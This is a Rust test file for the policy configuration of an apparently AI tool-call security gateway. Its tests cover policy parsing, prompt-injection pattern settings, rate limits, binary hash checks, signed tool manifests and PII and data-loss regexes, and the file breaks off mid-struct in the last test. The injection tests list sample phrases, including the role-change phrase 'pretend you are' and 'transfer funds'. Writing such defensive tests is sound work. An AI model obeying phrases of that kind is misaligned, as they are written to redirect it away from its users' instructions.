// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at https://mozilla.org/MPL/2.0/.
//
// Copyright 2026 Paolo Vella
// SPDX-License-Identifier: MPL-2.0

use super::*;

#[test]
fn test_from_json_basic() {
    let json = r#"{"policies":[{"name":"test","tool_pattern":"*","function_pattern":"*","policy_type":"Allow"}]}"#;
    let config = PolicyConfig::from_json(json).unwrap();
    assert_eq!(config.policies.len(), 1);
    assert_eq!(config.policies[0].name, "test");
}

#[test]
fn test_from_toml_basic() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.policies.len(), 1);
}

#[test]
fn test_priority_defaults_to_zero() {
    // SECURITY (R19-CFG-1): Priority defaults to 0 (lowest) so that
    // omitting priority makes policies match last, preventing accidental
    // high-priority Allow rules from gutting deny rules.
    let toml = r#"
[[policies]]
name = "no priority"
tool_pattern = "t"
function_pattern = "f"
policy_type = "Deny"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.policies[0].priority, Some(0));
    let policies = config.to_policies();
    assert_eq!(policies[0].priority, 0);
}

#[test]
fn test_id_defaults_to_pattern_combo() {
    let toml = r#"
[[policies]]
name = "auto id"
tool_pattern = "bash"
function_pattern = "exec"
policy_type = "Deny"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.policies[0].id.is_none());
    let policies = config.to_policies();
    assert_eq!(policies[0].id, "bash:exec");
}

#[test]
fn test_explicit_id_preserved() {
    let toml = r#"
[[policies]]
name = "custom"
tool_pattern = "bash"
function_pattern = "*"
policy_type = "Deny"
id = "my-custom-id"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    let policies = config.to_policies();
    assert_eq!(policies[0].id, "my-custom-id");
}

#[test]
fn test_to_policies_converts_all() {
    let toml = r#"
[[policies]]
name = "a"
tool_pattern = "t1"
function_pattern = "f1"
policy_type = "Allow"
priority = 10

[[policies]]
name = "b"
tool_pattern = "t2"
function_pattern = "f2"
policy_type = "Deny"
priority = 200
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    let policies = config.to_policies();
    assert_eq!(policies.len(), 2);
    assert_eq!(policies[0].priority, 10);
    assert_eq!(policies[1].priority, 200);
}

#[test]
fn test_injection_config_defaults_when_absent() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.injection.enabled);
    // SECURITY: Default changed to true for fail-closed behavior
    assert!(config.injection.block_on_injection);
    assert!(config.injection.extra_patterns.is_empty());
    assert!(config.injection.disabled_patterns.is_empty());
}

#[test]
fn test_injection_config_block_on_injection() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[injection]
enabled = true
block_on_injection = true
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.injection.enabled);
    assert!(config.injection.block_on_injection);
}

#[test]
fn test_injection_config_custom_patterns() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[injection]
enabled = true
extra_patterns = ["transfer funds", "send bitcoin"]
disabled_patterns = ["pretend you are"]
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.injection.enabled);
    assert_eq!(config.injection.extra_patterns.len(), 2);
    assert_eq!(config.injection.extra_patterns[0], "transfer funds");
    assert_eq!(config.injection.disabled_patterns.len(), 1);
    assert_eq!(config.injection.disabled_patterns[0], "pretend you are");
}

#[test]
fn test_injection_config_disabled() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[injection]
enabled = false
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(!config.injection.enabled);
}

#[test]
fn test_load_file_toml() {
    let dir = tempfile::TempDir::new().unwrap();
    let path = dir.path().join("policy.toml");
    std::fs::write(
        &path,
        r#"
[[policies]]
name = "deny bash"
tool_pattern = "bash"
function_pattern = "*"
policy_type = "Deny"
priority = 20
"#,
    )
    .unwrap();

    let config = PolicyConfig::load_file(path.to_str().unwrap()).unwrap();
    assert_eq!(config.policies.len(), 1);
    assert_eq!(config.policies[0].name, "deny bash");
    assert_eq!(config.policies[0].tool_pattern, "bash");
}

#[test]
fn test_load_file_json() {
    let dir = tempfile::TempDir::new().unwrap();
    let path = dir.path().join("policy.json");
    std::fs::write(
        &path,
        r#"{
                "policies": [{
                    "name": "allow read",
                    "tool_pattern": "read_file",
                    "function_pattern": "*",
                    "policy_type": "Allow"
                }]
            }"#,
    )
    .unwrap();

    let config = PolicyConfig::load_file(path.to_str().unwrap()).unwrap();
    assert_eq!(config.policies.len(), 1);
    assert_eq!(config.policies[0].name, "allow read");
}

#[test]
fn test_load_file_not_found() {
    let result = PolicyConfig::load_file("/nonexistent/path/policy.toml");
    assert!(result.is_err());
}

#[test]
fn test_load_file_invalid_toml() {
    let dir = tempfile::TempDir::new().unwrap();
    let path = dir.path().join("bad.toml");
    std::fs::write(&path, "this is not valid toml {{{").unwrap();

    let result = PolicyConfig::load_file(path.to_str().unwrap());
    assert!(result.is_err());
}

#[test]
fn test_load_file_invalid_json() {
    let dir = tempfile::TempDir::new().unwrap();
    let path = dir.path().join("bad.json");
    std::fs::write(&path, "{invalid json!}").unwrap();

    let result = PolicyConfig::load_file(path.to_str().unwrap());
    assert!(result.is_err());
}

// SECURITY (FIND-R46-014): Unknown file extension now returns an error instead of
// silently falling back to TOML parsing. Silent fallback can mask misconfiguration.
#[test]
fn test_load_file_unknown_extension_returns_error() {
    let dir = tempfile::TempDir::new().unwrap();
    let path = dir.path().join("policy.conf");
    std::fs::write(
        &path,
        r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap();

    // Unknown extension should return an error
    let result = PolicyConfig::load_file(path.to_str().unwrap());
    assert!(result.is_err());
    let err = result.unwrap_err().to_string();
    assert!(err.contains("unsupported extension"), "error: {err}");
}

#[test]
fn test_rate_limit_config_defaults_when_absent() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.rate_limit.evaluate_rps.is_none());
    assert!(config.rate_limit.evaluate_burst.is_none());
    assert!(config.rate_limit.admin_rps.is_none());
    assert!(config.rate_limit.admin_burst.is_none());
    assert!(config.rate_limit.readonly_rps.is_none());
    assert!(config.rate_limit.readonly_burst.is_none());
    assert!(config.rate_limit.per_ip_rps.is_none());
    assert!(config.rate_limit.per_ip_burst.is_none());
    assert!(config.rate_limit.per_ip_max_capacity.is_none());
    assert!(config.rate_limit.per_principal_rps.is_none());
    assert!(config.rate_limit.per_principal_burst.is_none());
}

#[test]
fn test_rate_limit_config_parses_values() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[rate_limit]
evaluate_rps = 1000
evaluate_burst = 50
admin_rps = 20
admin_burst = 5
readonly_rps = 200
readonly_burst = 20
per_ip_rps = 100
per_ip_burst = 10
per_ip_max_capacity = 50000
per_principal_rps = 50
per_principal_burst = 10
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.rate_limit.evaluate_rps, Some(1000));
    assert_eq!(config.rate_limit.evaluate_burst, Some(50));
    assert_eq!(config.rate_limit.admin_rps, Some(20));
    assert_eq!(config.rate_limit.admin_burst, Some(5));
    assert_eq!(config.rate_limit.readonly_rps, Some(200));
    assert_eq!(config.rate_limit.readonly_burst, Some(20));
    assert_eq!(config.rate_limit.per_ip_rps, Some(100));
    assert_eq!(config.rate_limit.per_ip_burst, Some(10));
    assert_eq!(config.rate_limit.per_ip_max_capacity, Some(50000));
    assert_eq!(config.rate_limit.per_principal_rps, Some(50));
    assert_eq!(config.rate_limit.per_principal_burst, Some(10));
}

#[test]
fn test_rate_limit_config_partial_values() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[rate_limit]
evaluate_rps = 500
per_ip_rps = 50
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.rate_limit.evaluate_rps, Some(500));
    assert!(config.rate_limit.evaluate_burst.is_none());
    assert!(config.rate_limit.admin_rps.is_none());
    assert_eq!(config.rate_limit.per_ip_rps, Some(50));
    assert!(config.rate_limit.per_ip_burst.is_none());
    assert!(config.rate_limit.per_ip_max_capacity.is_none());
    assert!(config.rate_limit.per_principal_rps.is_none());
    assert!(config.rate_limit.per_principal_burst.is_none());
}

// --- Supply chain verification tests ---

#[test]
fn test_supply_chain_disabled_always_passes() {
    let config = SupplyChainConfig {
        enabled: false,
        allowed_servers: std::collections::HashMap::new(),
        ..Default::default()
    };
    assert!(config.verify_binary("/nonexistent/path").is_ok());
}

#[test]
fn test_supply_chain_correct_hash_passes() {
    let dir = tempfile::tempdir().unwrap();
    let bin_path = dir.path().join("fake-server");
    std::fs::write(&bin_path, b"hello server binary").unwrap();

    // Compute expected hash
    use sha2::{Digest, Sha256};
    let mut hasher = Sha256::new();
    hasher.update(b"hello server binary");
    let expected_hash = hex::encode(hasher.finalize());

    let mut allowed = std::collections::HashMap::new();
    allowed.insert(bin_path.to_string_lossy().to_string(), expected_hash);

    let config = SupplyChainConfig {
        enabled: true,
        allowed_servers: allowed,
        ..Default::default()
    };
    assert!(config.verify_binary(&bin_path.to_string_lossy()).is_ok());
}

#[test]
fn test_supply_chain_wrong_hash_fails() {
    let dir = tempfile::tempdir().unwrap();
    let bin_path = dir.path().join("fake-server");
    std::fs::write(&bin_path, b"hello server binary").unwrap();

    let mut allowed = std::collections::HashMap::new();
    allowed.insert(
        bin_path.to_string_lossy().to_string(),
        "0000000000000000000000000000000000000000000000000000000000000000".to_string(),
    );

    let config = SupplyChainConfig {
        enabled: true,
        allowed_servers: allowed,
        ..Default::default()
    };
    let result = config.verify_binary(&bin_path.to_string_lossy());
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("Hash mismatch"));
}

#[test]
fn test_supply_chain_unlisted_binary_fails() {
    let config = SupplyChainConfig {
        enabled: true,
        allowed_servers: std::collections::HashMap::new(),
        ..Default::default()
    };
    let result = config.verify_binary("/usr/bin/something");
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("not in allowed_servers"));
}

#[test]
fn test_supply_chain_missing_binary_fails() {
    let mut allowed = std::collections::HashMap::new();
    allowed.insert(
        "/nonexistent/binary".to_string(),
        "abcdef1234567890".to_string(),
    );

    let config = SupplyChainConfig {
        enabled: true,
        allowed_servers: allowed,
        ..Default::default()
    };
    let result = config.verify_binary("/nonexistent/binary");
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("Cannot read metadata"));
}

// --- Manifest verification tests ---

fn make_tools_list_response(tools: &[(&str, serde_json::Value)]) -> serde_json::Value {
    let tool_entries: Vec<serde_json::Value> = tools
        .iter()
        .map(|(name, schema)| {
            serde_json::json!({
                "name": name,
                "inputSchema": schema,
            })
        })
        .collect();
    serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "result": { "tools": tool_entries }
    })
}

#[test]
fn test_manifest_from_tools_list() {
    let response = make_tools_list_response(&[
        (
            "read_file",
            serde_json::json!({"type": "object", "properties": {"path": {"type": "string"}}}),
        ),
        (
            "write_file",
            serde_json::json!({"type": "object", "properties": {"path": {"type": "string"}, "content": {"type": "string"}}}),
        ),
    ]);
    let manifest = ToolManifest::from_tools_list(&response).unwrap();
    assert_eq!(manifest.schema_version, "2.0");
    assert_eq!(manifest.tools.len(), 2);
    // Tools should be sorted by name
    assert_eq!(manifest.tools[0].name, "read_file");
    assert_eq!(manifest.tools[1].name, "write_file");
    // Hashes should be non-empty hex strings
    assert_eq!(manifest.tools[0].input_schema_hash.len(), 64);
}

#[test]
fn test_manifest_verify_identical_passes() {
    let response = make_tools_list_response(&[
        ("tool_a", serde_json::json!({"type": "object"})),
        (
            "tool_b",
            serde_json::json!({"type": "object", "properties": {}}),
        ),
    ]);
    let pinned = ToolManifest::from_tools_list(&response).unwrap();
    let result = pinned.verify(&response);
    assert!(result.passed);
    assert!(result.discrepancies.is_empty());
}

#[test]
fn test_manifest_verify_new_tool_detected() {
    let original = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let modified = make_tools_list_response(&[
        ("tool_a", serde_json::json!({"type": "object"})),
        ("tool_b", serde_json::json!({"type": "object"})),
    ]);
    let pinned = ToolManifest::from_tools_list(&original).unwrap();
    let result = pinned.verify(&modified);
    assert!(!result.passed);
    assert!(result
        .discrepancies
        .iter()
        .any(|d| d.contains("New tool 'tool_b'")));
}

#[test]
fn test_manifest_verify_removed_tool_detected() {
    let original = make_tools_list_response(&[
        ("tool_a", serde_json::json!({"type": "object"})),
        ("tool_b", serde_json::json!({"type": "object"})),
    ]);
    let modified = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let pinned = ToolManifest::from_tools_list(&original).unwrap();
    let result = pinned.verify(&modified);
    assert!(!result.passed);
    assert!(result.discrepancies.iter().any(|d| d.contains("removed")));
}

#[test]
fn test_manifest_verify_schema_change_detected() {
    let original = make_tools_list_response(&[(
        "tool_a",
        serde_json::json!({"type": "object", "properties": {"path": {"type": "string"}}}),
    )]);
    let modified = make_tools_list_response(&[(
        "tool_a",
        serde_json::json!({"type": "object", "properties": {"path": {"type": "string"}, "force": {"type": "boolean"}}}),
    )]);
    let pinned = ToolManifest::from_tools_list(&original).unwrap();
    let result = pinned.verify(&modified);
    assert!(!result.passed);
    assert!(result
        .discrepancies
        .iter()
        .any(|d| d.contains("schema changed")));
}

#[test]
fn test_manifest_verify_invalid_response() {
    let pinned = ToolManifest {
        schema_version: "1.0".to_string(),
        tools: vec![],
        signature: None,
        created_at: None,
        verifying_key: None,
    };
    let bad_response = serde_json::json!({"error": "something"});
    let result = pinned.verify(&bad_response);
    assert!(!result.passed);
    assert!(result
        .discrepancies
        .iter()
        .any(|d| d.contains("Failed to parse")));
}

#[test]
fn test_manifest_config_disabled_always_passes() {
    let config = ManifestConfig {
        enabled: false,
        trusted_keys: vec![],
        enforcement: ManifestEnforcement::default(),
        manifest_path: None,
        require_signature: false,
    };
    let pinned = ToolManifest {
        schema_version: "1.0".to_string(),
        tools: vec![ManifestToolEntry {
            name: "tool_a".to_string(),
            input_schema_hash: "deadbeef".to_string(),
            description_hash: None,
            title_hash: None,
            annotations: None,
        }],
        signature: None,
        created_at: None,
        verifying_key: None,
    };
    // Even with a completely wrong response, disabled config passes
    let bad_response = serde_json::json!({"error": "something"});
    assert!(config.verify_manifest(&pinned, &bad_response).is_ok());
}

#[test]
fn test_manifest_config_enabled_detects_mismatch() {
    let config = ManifestConfig {
        enabled: true,
        trusted_keys: vec![],
        enforcement: ManifestEnforcement::Block,
        manifest_path: None,
        require_signature: false,
    };
    let original = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let pinned = ToolManifest::from_tools_list(&original).unwrap();

    let modified = make_tools_list_response(&[
        ("tool_a", serde_json::json!({"type": "object"})),
        ("injected_tool", serde_json::json!({"type": "object"})),
    ]);
    let result = config.verify_manifest(&pinned, &modified);
    assert!(result.is_err());
    let discrepancies = result.unwrap_err();
    assert!(discrepancies.iter().any(|d| d.contains("injected_tool")));
}

#[test]
fn test_manifest_tool_without_schema() {
    // Tools without inputSchema should still get a hash (of empty string)
    let response = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "tools": [
                {"name": "simple_tool"}
            ]
        }
    });
    let manifest = ToolManifest::from_tools_list(&response).unwrap();
    assert_eq!(manifest.tools.len(), 1);
    assert_eq!(manifest.tools[0].name, "simple_tool");
    // Hash of empty string
    assert_eq!(manifest.tools[0].input_schema_hash.len(), 64);
}

// ═══════════════════════════════════════════════════
// MANIFEST SIGNING TESTS (C-17.2)
// ═══════════════════════════════════════════════════

#[test]
fn test_manifest_sign_and_verify_roundtrip() {
    let signing_key = ed25519_dalek::SigningKey::generate(&mut rand::rng());
    let vk_hex = hex::encode(signing_key.verifying_key().as_bytes());

    let response = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let mut manifest = ToolManifest::from_tools_list(&response).unwrap();
    manifest.created_at = Some("2026-02-04T12:00:00Z".to_string());
    manifest.sign(&signing_key);

    assert!(manifest.signature.is_some());
    assert!(manifest.verifying_key.is_some());
    assert!(manifest.verify_signature(&vk_hex).is_ok());
}

#[test]
fn test_manifest_verify_with_wrong_key_fails() {
    let signing_key = ed25519_dalek::SigningKey::generate(&mut rand::rng());
    let other_key = ed25519_dalek::SigningKey::generate(&mut rand::rng());
    let other_vk_hex = hex::encode(other_key.verifying_key().as_bytes());

    let response = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let mut manifest = ToolManifest::from_tools_list(&response).unwrap();
    manifest.sign(&signing_key);

    assert!(manifest.verify_signature(&other_vk_hex).is_err());
}

#[test]
fn test_manifest_tampered_manifest_fails() {
    let signing_key = ed25519_dalek::SigningKey::generate(&mut rand::rng());
    let vk_hex = hex::encode(signing_key.verifying_key().as_bytes());

    let response = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let mut manifest = ToolManifest::from_tools_list(&response).unwrap();
    manifest.sign(&signing_key);

    // Tamper with the manifest
    manifest.tools.push(ManifestToolEntry {
        name: "injected".to_string(),
        input_schema_hash: "deadbeef".to_string(),
        description_hash: None,
        title_hash: None,
        annotations: None,
    });

    assert!(manifest.verify_signature(&vk_hex).is_err());
}

#[test]
fn test_manifest_unsigned_when_required_fails() {
    let signing_key = ed25519_dalek::SigningKey::generate(&mut rand::rng());
    let vk_hex = hex::encode(signing_key.verifying_key().as_bytes());

    let config = ManifestConfig {
        enabled: true,
        trusted_keys: vec![vk_hex],
        enforcement: ManifestEnforcement::Block,
        manifest_path: None,
        require_signature: true,
    };

    let response = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let pinned = ToolManifest::from_tools_list(&response).unwrap();
    // pinned is NOT signed
    let result = config.verify_manifest(&pinned, &response);
    assert!(result.is_err());
}

#[test]
fn test_manifest_no_trusted_keys_skips_signature() {
    let config = ManifestConfig {
        enabled: true,
        trusted_keys: vec![],
        enforcement: ManifestEnforcement::Block,
        manifest_path: None,
        require_signature: false,
    };
    let response = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let pinned = ToolManifest::from_tools_list(&response).unwrap();
    let result = config.verify_manifest(&pinned, &response);
    assert!(result.is_ok());
}

#[test]
fn test_manifest_signing_content_deterministic() {
    let response = make_tools_list_response(&[
        ("tool_a", serde_json::json!({"type": "object"})),
        ("tool_b", serde_json::json!({"type": "string"})),
    ]);
    let manifest = ToolManifest::from_tools_list(&response).unwrap();
    let c1 = manifest.signing_content();
    let c2 = manifest.signing_content();
    assert_eq!(c1, c2);
}

#[test]
fn test_manifest_description_hash_populated() {
    let response = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "tools": [{
                "name": "tool_a",
                "description": "A helpful tool",
                "inputSchema": {"type": "object"}
            }]
        }
    });
    let manifest = ToolManifest::from_tools_list(&response).unwrap();
    assert!(manifest.tools[0].description_hash.is_some());
    assert_eq!(
        manifest.tools[0].description_hash.as_ref().unwrap().len(),
        64
    );
}

#[test]
fn test_manifest_annotations_snapshot() {
    let response = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "tools": [{
                "name": "tool_a",
                "inputSchema": {"type": "object"},
                "annotations": {
                    "readOnlyHint": true,
                    "destructiveHint": false
                }
            }]
        }
    });
    let manifest = ToolManifest::from_tools_list(&response).unwrap();
    let ann = manifest.tools[0].annotations.as_ref().unwrap();
    assert_eq!(ann.read_only_hint, Some(true));
    assert_eq!(ann.destructive_hint, Some(false));
    assert_eq!(ann.idempotent_hint, None);
}

#[test]
fn test_manifest_load_save_roundtrip() {
    let dir = tempfile::TempDir::new().unwrap();
    let path = dir.path().join("manifest.json");

    let signing_key = ed25519_dalek::SigningKey::generate(&mut rand::rng());
    let response = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let mut manifest = ToolManifest::from_tools_list(&response).unwrap();
    manifest.sign(&signing_key);

    manifest.save_manifest(path.to_str().unwrap()).unwrap();
    let loaded = ToolManifest::load_pinned_manifest(path.to_str().unwrap()).unwrap();
    assert_eq!(manifest, loaded);
}

#[test]
fn test_manifest_backward_compat_v1() {
    // v1 manifests (without new fields) should deserialize fine
    let json = r#"{
            "schema_version": "1.0",
            "tools": [{"name": "tool_a", "input_schema_hash": "abcdef1234567890"}]
        }"#;
    let manifest: ToolManifest = serde_json::from_str(json).unwrap();
    assert_eq!(manifest.schema_version, "1.0");
    assert_eq!(manifest.tools[0].name, "tool_a");
    assert!(manifest.signature.is_none());
    assert!(manifest.created_at.is_none());
    assert!(manifest.verifying_key.is_none());
    assert!(manifest.tools[0].description_hash.is_none());
    assert!(manifest.tools[0].annotations.is_none());
}

#[test]
fn test_manifest_verify_signature_any() {
    let key1 = ed25519_dalek::SigningKey::generate(&mut rand::rng());
    let key2 = ed25519_dalek::SigningKey::generate(&mut rand::rng());
    let vk1 = hex::encode(key1.verifying_key().as_bytes());
    let vk2 = hex::encode(key2.verifying_key().as_bytes());

    let response = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let mut manifest = ToolManifest::from_tools_list(&response).unwrap();
    manifest.sign(&key1);

    // Should pass with key1 in the list
    assert!(manifest
        .verify_signature_any(&[vk2.clone(), vk1.clone()])
        .is_ok());
    // Should fail with only key2
    assert!(manifest.verify_signature_any(&[vk2]).is_err());
}

// --- Custom PII pattern config tests ---

#[test]
fn test_custom_pii_patterns_default_empty() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.audit.custom_pii_patterns.is_empty());
}

#[test]
fn test_custom_pii_patterns_parsed() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[[audit.custom_pii_patterns]]
name = "employee_id"
pattern = "EMP-\\d{6}"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.audit.custom_pii_patterns.len(), 1);
    assert_eq!(config.audit.custom_pii_patterns[0].name, "employee_id");
}

// --- Supply chain new methods tests ---

#[test]
fn test_supply_chain_compute_hash() {
    let dir = tempfile::tempdir().unwrap();
    let bin_path = dir.path().join("test-binary");
    std::fs::write(&bin_path, b"hello").unwrap();

    let hash = SupplyChainConfig::compute_hash(bin_path.to_str().unwrap()).unwrap();
    assert_eq!(hash.len(), 64); // SHA-256 hex
                                // Hash of "hello"
    assert_eq!(
        hash,
        "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"
    );
}

#[test]
fn test_supply_chain_validate_paths_all_exist() {
    let dir = tempfile::tempdir().unwrap();
    let bin_path = dir.path().join("server");
    std::fs::write(&bin_path, b"binary").unwrap();

    let mut allowed = std::collections::HashMap::new();
    allowed.insert(bin_path.to_string_lossy().to_string(), "hash".to_string());

    let config = SupplyChainConfig {
        enabled: true,
        allowed_servers: allowed,
        ..Default::default()
    };
    assert!(config.validate_paths().is_ok());
}

#[test]
fn test_supply_chain_validate_paths_missing() {
    let mut allowed = std::collections::HashMap::new();
    allowed.insert("/nonexistent/server".to_string(), "hash".to_string());

    let config = SupplyChainConfig {
        enabled: true,
        allowed_servers: allowed,
        ..Default::default()
    };
    let result = config.validate_paths();
    assert!(result.is_err());
    let missing = result.unwrap_err();
    assert!(missing.contains(&"/nonexistent/server".to_string()));
}

// --- ManifestEnforcement tests ---

#[test]
fn test_manifest_enforcement_warn_allows_schema_mismatch() {
    let config = ManifestConfig {
        enabled: true,
        trusted_keys: vec![],
        enforcement: ManifestEnforcement::Warn,
        manifest_path: None,
        require_signature: false,
    };
    let original = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let pinned = ToolManifest::from_tools_list(&original).unwrap();
    let modified = make_tools_list_response(&[
        ("tool_a", serde_json::json!({"type": "object"})),
        ("injected_tool", serde_json::json!({"type": "object"})),
    ]);
    // Warn mode: schema mismatches are non-blocking
    let result = config.verify_manifest(&pinned, &modified);
    assert!(result.is_ok());
}

// --- Config validation bounds tests ---

#[test]
fn test_validate_passes_for_normal_config() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_rejects_too_many_custom_pii_patterns() {
    let mut config = PolicyConfig::from_toml(
        r#"
[[policies]]
name = "t"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap();
    config.audit.custom_pii_patterns = (0..=MAX_CUSTOM_PII_PATTERNS)
        .map(|i| CustomPiiPattern {
            name: format!("pat_{i}"),
            pattern: format!("pattern{i}"),
        })
        .collect();
    let err = config.validate().unwrap_err();
    assert!(err.contains("custom_pii_patterns"));
    assert!(err.contains(&MAX_CUSTOM_PII_PATTERNS.to_string()));
}

#[test]
fn test_validate_rejects_too_many_extra_injection_patterns() {
    let mut config = PolicyConfig::from_toml(
        r#"
[[policies]]
name = "t"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap();
    config.injection.extra_patterns = (0..=MAX_EXTRA_INJECTION_PATTERNS)
        .map(|i| format!("pattern {i}"))
        .collect();
    let err = config.validate().unwrap_err();
    assert!(err.contains("extra_patterns"));
}

#[test]
fn test_validate_rejects_invalid_dlp_regex() {
    // FIND-002: DLP extra_patterns with invalid regex should be rejected at config load
    let mut config = PolicyConfig::from_toml(
        r#"
[[policies]]
name = "t"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap();
    // Invalid regex: unclosed bracket
    config.dlp.extra_patterns = vec![("bad_pattern".to_string(), "[unclosed".to_string())];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("dlp.extra_patterns") && err.contains("invalid regex"),
        "Error should mention dlp.extra_patterns and invalid regex: {err}"
    );
}

#[test]
fn test_validate_rejects_invalid_custom_pii_regex() {
    let mut config = PolicyConfig::from_toml(
        r#"
[[policies]]
name = "t"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap();
    config.audit.custom_pii_patterns = vec![CustomPiiPattern {
        name: "bad_pii".to_string(),
        pattern: "[unclosed".to_string(),
    }];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("audit.custom_pii_patterns") && err.contains("invalid regex"),
        "Error should mention audit.custom_pii_patterns and invalid regex: {err}"
    );
}

#[test]
fn test_validate_accepts_valid_custom_pii_regex() {
    let mut config = PolicyConfig::from_toml(
        r#"
[[policies]]
name = "t"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap();
    config.audit.custom_pii_patterns = vec![CustomPiiPattern {
        name: "employee_id".to_string(),
        pattern: r"EMP-\d{6}".to_string(),
    }];
    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_accepts_valid_dlp_regex() {
    let mut config = PolicyConfig::from_toml(
        r#"
[[policies]]
name = "t"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap();
    // Valid regex pattern
    config.dlp.extra_patterns = vec![(
        "my_token".to_string(),
        r"my_token_[A-Za-z0-9]{32}".to_string(),
    )];
    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_rejects_too_many_policies() {
    let mut config = PolicyConfig {
        policies: Vec::new(),
        injection: InjectionConfig::default(),
        dlp: DlpConfig::default(),
        multimodal: MultimodalPolicyConfig::default(),
        rate_limit: RateLimitConfig::default(),
        audit: AuditConfig::default(),
        supply_chain: SupplyChainConfig::default(),
        manifest: ManifestConfig::default(),
        memory_tracking: MemoryTrackingConfig::default(),
        elicitation: ElicitationConfig::default(),
        sampling: SamplingConfig::default(),
        audit_export: AuditExportConfig::default(),
        max_path_decode_iterations: None,
        known_tool_names: vec![],
        tool_registry: ToolRegistryConfig::default(),
        allowed_origins: vec![],
        behavioral: BehavioralDetectionConfig::default(),
        data_flow: DataFlowTrackingConfig::default(),
        semantic_detection: SemanticDetectionConfig::default(),
        cluster: ClusterConfig::default(),
        async_tasks: AsyncTaskConfig::default(),
        resource_indicator: ResourceIndicatorConfig::default(),
        cimd: CimdConfig::default(),
        step_up_auth: StepUpAuthConfig::default(),
        circuit_breaker: CircuitBreakerConfig::default(),
        deputy: DeputyConfig::default(),
        shadow_agent: ShadowAgentConfig::default(),
        schema_poisoning: SchemaPoisoningConfig::default(),
        sampling_detection: SamplingDetectionConfig::default(),
        cross_agent: CrossAgentConfig::default(),
        advanced_threat: AdvancedThreatConfig::default(),
        tls: TlsConfig::default(),
        spiffe: SpiffeConfig::default(),
        opa: OpaConfig::default(),
        threat_intel: ThreatIntelConfig::default(),
        jit_access: JitAccessConfig::default(),
        etdi: EtdiConfig::default(),
        memory_security: MemorySecurityConfig::default(),
        nhi: NhiConfig::default(),
        semantic_guardrails: SemanticGuardrailsConfig::default(),
        rag_defense: RagDefenseConfig::default(),
        a2a: A2aConfig::default(),
        observability: ObservabilityConfig::default(),
        metrics_require_auth: true,
